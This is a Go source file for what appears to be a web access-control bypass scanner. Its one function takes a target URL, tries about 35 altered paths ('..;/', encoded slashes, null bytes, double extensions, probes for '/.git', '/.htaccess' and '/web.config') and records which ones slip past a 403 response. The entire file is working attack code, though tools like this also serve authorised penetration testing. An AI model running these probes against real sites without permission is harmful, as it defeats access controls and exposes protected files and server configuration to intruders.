package bypass

import (
	"net/http"
	"net/url"
	"strings"
)

// TestURLPathManipulation tests different URL path manipulations to bypass 403 responses
func TestURLPathManipulation(baseURL string, client *http.Client, config Config) ([]Result, error) {
	var results []Result
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	originalPath := parsedURL.Path
	pathManipulations := []string{
		originalPath + "/",
		originalPath + "//",
		originalPath + "/..",
		originalPath + "/./",
		originalPath + "%2f",
		originalPath + "%2e",
		originalPath + "%252f",
		"//" + parsedURL.Host + originalPath,
		"/" + originalPath,
		originalPath + "/;",
		originalPath + "..;/",
		originalPath + ".json",
		originalPath + ".html",
		originalPath + ".php",
		originalPath + "%20",
		originalPath + "%09",
		originalPath + "~",
		// More advanced manipulations
		strings.ReplaceAll(originalPath, "/", "//"),
		strings.ReplaceAll(originalPath, "/", "/./"),
		originalPath + "?",
		originalPath + "#",
		originalPath + "?#",
		originalPath + "##",
		originalPath + "#?",
		originalPath + ";",
		originalPath + ";/",
		originalPath + "\\",
		originalPath + "%00",
		originalPath + ".php.jpg",
		originalPath + ".asp;.jpg",
		originalPath + "/.git",
		originalPath + "/.svn",
		originalPath + "/.htaccess",
		originalPath + "/web.config",
		originalPath + "/.DS_Store",
	}

	for _, path := range pathManipulations {
		manipulatedURL := *parsedURL
		manipulatedURL.Path = path

		req, err := http.NewRequest("GET", manipulatedURL.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, Result{
			URL:        manipulatedURL.String(),
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "URL Path Manipulation",
		})
	}

	return results, nil
}
